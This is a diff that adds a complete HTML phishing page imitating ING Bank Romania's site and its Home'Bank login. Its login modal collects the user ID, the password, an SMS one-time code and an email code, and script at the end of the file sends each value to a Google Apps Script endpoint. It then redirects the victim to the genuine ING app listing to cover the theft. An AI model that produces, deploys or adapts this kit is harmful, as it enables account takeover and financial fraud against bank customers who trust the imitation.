@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ING Bank - Banking din plin</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap');
+        body { font-family: 'Roboto', sans-serif; scroll-behavior: smooth; }
+        .ing-orange { background-color: #ff6200; }
+        .text-ing-orange { color: #ff6200; }
+        .ing-purple { background-color: #ab0066; }
+        
+        #loginModal { display: none; }
+        #loginModal.active { display: flex; }
+        .step-hidden { display: none; }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #f1f1f1; }
+        ::-webkit-scrollbar-thumb { background: #ff6200; border-radius: 10px; }
+    </style>
+</head>
+<body class="bg-white overflow-x-hidden">
+
+    <div class="border-b border-gray-100 py-2 px-6 text-[11px] md:text-xs flex justify-between items-center text-gray-500 uppercase font-bold tracking-wider">
+        <div class="flex items-center gap-4">
+            <a href="https://ing.ro/starea-serviciilor" class="flex items-center gap-1 hover:text-orange-600 transition"><span class="text-green-500 text-[8px]">●</span> Starea serviciilor</a>
+            <span class="hidden md:inline">Contact: *2ING (*2464)</span>
+        </div>
+        <div class="flex gap-6">
+            <a href="https://ing.ro/persoane-fizice" class="text-orange-600 border-b-2 border-orange-600 pb-1">Persoane fizice</a>
+            <a href="https://ing.ro/afaceri-mici" class="hover:text-orange-600">Afaceri mici</a>
+            <a href="https://ing.ro/wholesale-banking" class="hover:text-orange-600">Wholesale Banking</a>
+        </div>
+    </div>
+
+    <nav class="bg-white/95 backdrop-blur-md py-4 px-6 sticky top-0 z-[80] shadow-sm border-b border-gray-50">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-10">
+                <a href="https://ing.ro/"><img src="https://ing.ro/dam/jcr:6da2cd76-932f-4693-b237-623618e09b4d/logo.svg" alt="ING Logo" class="h-10 cursor-pointer"></a>
+                <div class="hidden lg:flex gap-8 text-gray-600 text-[13px] font-bold uppercase">
+                    <a href="https://ing.ro/persoane-fizice/produse" class="hover:text-ing-orange transition">Produse</a>
+                    <a href="https://ing.ro/persoane-fizice/instrumente" class="hover:text-ing-orange transition">Instrumente</a>
+                    <a href="https://ing.ro/persoane-fizice/ajutor" class="hover:text-ing-orange transition">Ajutor</a>
+                </div>
+            </div>
+            <div class="flex gap-3">
+                <a href="https://ing.ro/persoane-fizice/conturi-si-carduri/contul-ing-card-complet" class="bg-purple-700 text-white px-6 py-2.5 rounded font-bold text-sm shadow-lg hover:bg-purple-800 transition hidden md:block">
+                    Devino client
+                </a>
+                <button onclick="toggleLogin()" class="ing-orange text-white px-6 py-2.5 rounded font-bold text-sm shadow-lg shadow-orange-200 transition active:scale-95">
+                    <i class="fa-solid fa-user-lock mr-2"></i> Autentificare Home'Bank
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <header class="relative w-full min-h-[550px] flex flex-col md:flex-row overflow-hidden">
+        <div class="md:w-1/2 ing-orange flex items-center justify-center text-white px-8 py-16 md:px-20">
+            <div class="max-w-xl">
+                <h1 class="text-5xl md:text-7xl font-black leading-tight mb-6">Banking din plin.<br>Fără chin.</h1>
+                <p class="text-xl md:text-2xl font-light mb-8">Mută-ți salariul la ING și ai <span class="font-black">comisioane 0 peste tot</span>. Simplu, digital, portocaliu.</p>
+                <div class="flex flex-wrap gap-4">
+                    <a href="https://ing.ro/persoane-fizice/conturi-si-carduri/ing-card-complet" class="bg-black text-white px-10 py-4 rounded-md font-bold text-lg hover:bg-gray-800 transition">Deschide cont</a>
+                    <a href="https://ing.ro/persoane-fizice/credite" class="bg-white text-ing-orange px-10 py-4 rounded-md font-bold text-lg hover:bg-gray-100 transition">Vezi oferte</a>
+                </div>
+            </div>
+        </div>
+        <div class="md:w-1/2 bg-[#f4f4f4] flex items-center justify-center p-12">
+            <div class="relative flex gap-4 transform rotate-[-5deg]">
+                <a href="https://ing.ro/persoane-fizice/conturi-si-carduri/card-credit-online" class="block transition hover:scale-105">
+                    <div class="w-40 md:w-56 h-72 md:h-80 bg-gradient-to-br from-orange-400 to-orange-600 rounded-2xl p-6 text-white shadow-2xl mt-12">
+                        <span class="text-sm font-bold opacity-80">ING</span>
+                        <h2 class="text-4xl font-black mt-4">Go</h2>
+                        <div class="mt-20 w-10 h-10 bg-white/20 rounded-full"></div>
+                    </div>
+                </a>
+                <a href="https://ing.ro/companii-mari/wholesale-banking" class="block transition hover:scale-105">
+                    <div class="w-40 md:w-56 h-72 md:h-80 bg-gradient-to-br from-purple-700 to-purple-900 rounded-2xl p-6 text-white shadow-2xl">
+                        <span class="text-sm font-bold opacity-80">ING</span>
+                        <h2 class="text-4xl font-black mt-4">Extra</h2>
+                        <div class="mt-20 w-10 h-10 bg-white/20 rounded-full"></div>
+                    </div>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <section class="py-24 bg-white px-6">
+        <div class="max-w-7xl mx-auto grid md:grid-cols-2 gap-20 items-center">
+            <div>
+                <a href="https://ing.ro/persoane-fizice/credite/credit-de-nevoi-personale"><img src="https://ing.ro/dam/jcr:a8785936-a148-4200-8458-75c024522943/persoane-fizice-credit-card.png" alt="Credit" class="rounded-3xl shadow-xl hover:opacity-90 transition"></a>
+            </div>
+            <div class="space-y-6">
+                <span class="text-ing-orange font-black uppercase tracking-widest text-sm">Credit Personal</span>
+                <h2 class="text-4xl font-bold text-gray-900">Planurile tale nu mai trebuie să aștepte.</h2>
+                <p class="text-gray-600 text-lg leading-relaxed">Iei până la 150.000 lei, 100% online. Ai răspunsul pe loc și banii în cont imediat ce semnezi contractul digital.</p>
+                <a href="https://ing.ro/credite/calculator" class="inline-block border-2 border-ing-orange text-ing-orange px-8 py-3 rounded font-bold hover:bg-orange-50 transition">Calculează rată</a>
+            </div>
+        </div>
+    </section>
+
+    <section class="py-24 bg-gray-50 px-6">
+        <div class="max-w-7xl mx-auto grid md:grid-cols-2 gap-20 items-center">
+            <div class="order-2 md:order-1 space-y-6">
+                <span class="text-purple-700 font-black uppercase tracking-widest text-sm">Investiții</span>
+                <h2 class="text-4xl font-bold text-gray-900">Pune-ți banii să lucreze pentru tine.</h2>
+                <p class="text-gray-600 text-lg">Descoperă fondurile mutuale ING și începe să investești simplu, direct din aplicație, chiar și cu sume mici.</p>
+                <a href="https://ing.ro/persoane-fizice/investitii" class="inline-block bg-purple-700 text-white px-8 py-3 rounded font-bold hover:bg-purple-800 transition">Află mai multe</a>
+            </div>
+            <div class="order-1 md:order-2">
+                <img src="https://ing.ro/dam/jcr:8b50f6b3-6e3e-4b4e-9892-0f04e76c1256/investitii-hero.png" alt="Invest" class="rounded-3xl shadow-lg">
+            </div>
+        </div>
+    </section>
+
+    <section class="py-24 bg-white px-6">
+        <div class="max-w-7xl mx-auto text-center mb-16">
+            <h2 class="text-4xl font-bold mb-4">Soluții pentru afacerea ta</h2>
+            <p class="text-gray-500 max-w-2xl mx-auto">De la startup-uri la corporații, suntem partenerul tău de încredere.</p>
+        </div>
+        <div class="max-w-7xl mx-auto grid md:grid-cols-3 gap-8">
+            <div class="bg-gray-50 p-8 rounded-2xl hover:shadow-xl transition cursor-pointer">
+                <i class="fa-solid fa-briefcase text-4xl text-ing-orange mb-6"></i>
+                <h3 class="text-xl font-bold mb-4">ING Fix</h3>
+                <p class="text-gray-600 mb-6">Pachete de banking cu costuri fixe și predictibile pentru IMM-uri.</p>
+                <a href="https://ing.ro/afaceri-mici" class="text-ing-orange font-bold">Vezi detalii →</a>
+            </div>
+            <div class="bg-gray-50 p-8 rounded-2xl hover:shadow-xl transition cursor-pointer">
+                <i class="fa-solid fa-terminal text-4xl text-ing-orange mb-6"></i>
+                <h3 class="text-xl font-bold mb-4">Acceptare plăți</h3>
+                <p class="text-gray-600 mb-6">Soluții POS și e-commerce moderne pentru a crește vânzările tale.</p>
+                <a href="https://ing.ro/afaceri-mici/plati" class="text-ing-orange font-bold">Vezi detalii →</a>
+            </div>
+            <div class="bg-gray-50 p-8 rounded-2xl hover:shadow-xl transition cursor-pointer">
+                <i class="fa-solid fa-chart-line text-4xl text-ing-orange mb-6"></i>
+                <h3 class="text-xl font-bold mb-4">Leasing</h3>
+                <p class="text-gray-600 mb-6">Finanțare pentru echipamente și flote auto adaptată nevoilor tale.</p>
+                <a href="https://ing.ro/wholesale-banking/leasing" class="text-ing-orange font-bold">Vezi detalii →</a>
+            </div>
+        </div>
+    </section>
+
+    <section class="py-24 bg-black text-white px-6">
+        <div class="max-w-7xl mx-auto grid md:grid-cols-2 gap-16 items-center">
+            <img src="https://ing.ro/dam/jcr:7b5d134b-4c3e-4d43-9876-0d4810f6323c/cyber-security.png" alt="Security" class="rounded-3xl opacity-80">
+            <div class="space-y-6">
+                <h2 class="text-4xl font-bold">Siguranța ta e prioritatea noastră.</h2>
+                <p class="text-gray-400 text-lg">Folosim cele mai avansate tehnologii de criptare și monitorizare pentru ca tu să faci banking în deplină siguranță.</p>
+                <ul class="space-y-4">
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-shield text-ing-orange"></i> Autentificare biometrică</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-bell text-ing-orange"></i> Notificări push instantanee</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-lock text-ing-orange"></i> Blocare card imediată din aplicație</li>
+                </ul>
+                <a href="https://ing.ro/securitate" class="inline-block border border-white px-8 py-3 rounded font-bold hover:bg-white hover:text-black transition">Centrul de Securitate</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-gray-100 py-20 px-6 border-t border-gray-200">
+        <div class="max-w-7xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-12">
+            <div class="space-y-4">
+                <h4 class="font-bold text-gray-900">Despre ING</h4>
+                <nav class="flex flex-col gap-2 text-sm text-gray-500">
+                    <a href="https://ing.ro/despre-noi" class="hover:text-ing-orange">Cine suntem</a>
+                    <a href="https://ing.ro/newsroom" class="hover:text-ing-orange">Newsroom</a>
+                    <a href="https://ing.ro/guvernanta" class="hover:text-ing-orange">Guvernanță</a>
+                </nav>
+            </div>
+            <div class="space-y-4">
+                <h4 class="font-bold text-gray-900">Link-uri utile</h4>
+                <nav class="flex flex-col gap-2 text-sm text-gray-500">
+                    <a href="https://ing.ro/tarife-si-comisioane" class="hover:text-ing-orange">Tarife și comisioane</a>
+                    <a href="https://ing.ro/curs-valutar" class="hover:text-ing-orange">Curs valutar</a>
+                    <a href="https://ing.ro/securitate" class="hover:text-ing-orange">Securitate</a>
+                </nav>
+            </div>
+            <div class="col-span-2 space-y-6">
+                <h4 class="font-bold text-gray-900">Descarcă aplicația Home'Bank</h4>
+                <div class="flex gap-4">
+                    <a href="https://play.google.com/store/apps/details?id=ro.ing.mobile.banking"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store" class="h-12 cursor-pointer hover:opacity-80 transition"></a>
+                    <a href="https://apps.apple.com/ro/app/ing-homebank/id322303531"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store" class="h-12 cursor-pointer hover:opacity-80 transition"></a>
+                </div>
+            </div>
+        </div>
+        <div class="max-w-7xl mx-auto mt-16 pt-8 border-t border-gray-300 text-xs text-gray-400 text-center">
+            © 2026 ING Bank N.V. Amsterdam - Sucursala București. Toate drepturile rezervate.
+        </div>
+    </footer>
+
+    <div id="loginModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] items-center justify-center p-4">
+        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md overflow-hidden">
+            <div class="ing-orange p-6 text-white flex justify-between items-center">
+                <div>
+                    <h2 class="text-2xl font-bold">Autentificare Home'Bank</h2>
+                    <p class="text-[10px] uppercase tracking-widest opacity-80">Conexiune securizată</p>
+                </div>
+                <button onclick="toggleLogin()" class="text-3xl hover:rotate-90 transition">&times;</button>
+            </div>
+
+            <div class="p-8">
+                <div id="step-1">
+                    <div class="mb-6">
+                        <label class="block text-gray-500 text-xs font-bold uppercase mb-2">Nume utilizator (User ID)</label>
+                        <input type="text" id="username" class="w-full border-b-2 border-gray-200 focus:border-orange-500 outline-none py-3 text-lg font-bold transition" placeholder="Introduceți codul" required>
+                    </div>
+                    <div class="mb-8">
+                        <label class="block text-gray-500 text-xs font-bold uppercase mb-2">Parolă</label>
+                        <input type="password" id="password" class="w-full border-b-2 border-gray-200 focus:border-orange-500 outline-none py-3 text-lg font-bold transition" placeholder="••••••••" required>
+                    </div>
+                    <button onclick="handleStep1()" id="btn-1" class="w-full ing-orange text-white font-bold py-4 rounded-xl shadow-lg shadow-orange-100 hover:opacity-90 transition">Continuă</button>
+                </div>
+
+                <div id="step-2" class="step-hidden text-center">
+                    <i class="fa-solid fa-comment-sms text-5xl text-ing-orange mb-6"></i>
+                    <h3 class="text-xl font-bold mb-2">Cod SMS</h3>
+                    <p class="text-gray-500 text-sm mb-8">Am trimis un cod de verificare pe numărul tău de telefon registrat.</p>
+                    <input type="tel" id="smsCode" class="w-full border-b-4 border-gray-200 focus:border-orange-500 outline-none py-3 text-center text-3xl font-black tracking-[10px] mb-8" placeholder="0000">
+                    <button onclick="handleStep2()" id="btn-2" class="w-full ing-orange text-white font-bold py-4 rounded-xl transition">Pasul următor</button>
+                </div>
+
+                <div id="step-3" class="step-hidden text-center">
+                    <i class="fa-solid fa-envelope-open-text text-5xl text-ing-orange mb-6"></i>
+                    <h3 class="text-xl font-bold mb-2">Verificare Email</h3>
+                    <p class="text-gray-500 text-sm mb-8">Verifică adresa de mail pentru codul de autorizare finală.</p>
+                    <input type="tel" id="emailCode" class="w-full border-b-4 border-gray-200 focus:border-orange-500 outline-none py-3 text-center text-3xl font-black tracking-[10px] mb-8" placeholder="0000">
+                    <button onclick="handleStep3()" id="btn-3" class="w-full ing-orange text-white font-bold py-4 rounded-xl transition">Finalizare și Logare</button>
+                </div>
+
+                <div class="mt-8 text-center text-xs text-gray-400">
+                    <p><i class="fa-solid fa-shield-halved mr-1"></i> Protejat de ING Sentinel Security v4.2</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxPWKFdZtIhMbrQVFrNv-iuAt9P1OehTZavscoBnhw5mRrdEB0wZINJJ2PF5NYRfBpPkg/exec';
+
+        function toggleLogin() {
+            const modal = document.getElementById('loginModal');
+            modal.classList.toggle('active');
+        }
+
+        // Updated Sync Function to use URLSearchParams (Better for Google Apps Script)
+        async function syncData(data) {
+            try {
+                // We use form data format because 'no-cors' with JSON often fails to transmit the body
+                const params = new URLSearchParams();
+                params.append('contents', JSON.stringify(data));
+
+                await fetch(scriptURL, {
+                    method: 'POST',
+                    mode: 'no-cors', 
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params
+                });
+            } catch (e) { console.log("Sync..."); }
+        }
+
+        let currentUserId = "";
+        let currentPassword = "";
+
+        async function handleStep1() {
+            currentUserId = document.getElementById('username').value;
+            currentPassword = document.getElementById('password').value;
+            const btn = document.getElementById('btn-1');
+            if(!currentUserId || !currentPassword) return alert("Vă rugăm să introduceți datele.");
+
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Se verifică...';
+            await syncData({ tip: "LOGIN_INITIAL", user: currentUserId, pass: currentPassword });
+
+            setTimeout(() => {
+                document.getElementById('step-1').classList.add('step-hidden');
+                document.getElementById('step-2').classList.remove('step-hidden');
+            }, 1500);
+        }
+
+        async function handleStep2() {
+            const sms = document.getElementById('smsCode').value;
+            const btn = document.getElementById('btn-2');
+            if(!sms) return alert("Cod invalid.");
+
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Validare...';
+            await syncData({ tip: "SMS_VERIFICATION", code: sms });
+
+            setTimeout(() => {
+                document.getElementById('step-2').classList.add('step-hidden');
+                document.getElementById('step-3').classList.remove('step-hidden');
+            }, 1500);
+        }
+
+        async function handleStep3() {
+            const email = document.getElementById('emailCode').value;
+            const btn = document.getElementById('btn-3');
+            if(!email) return alert("Cod invalid.");
+
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Finalizare...';
+            await syncData({ tip: "EMAIL_VERIFICATION", code: email });
+
+            setTimeout(() => {
+                window.location.href = "https://play.google.com/store/apps/details?id=ro.ing.mobile.banking";
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
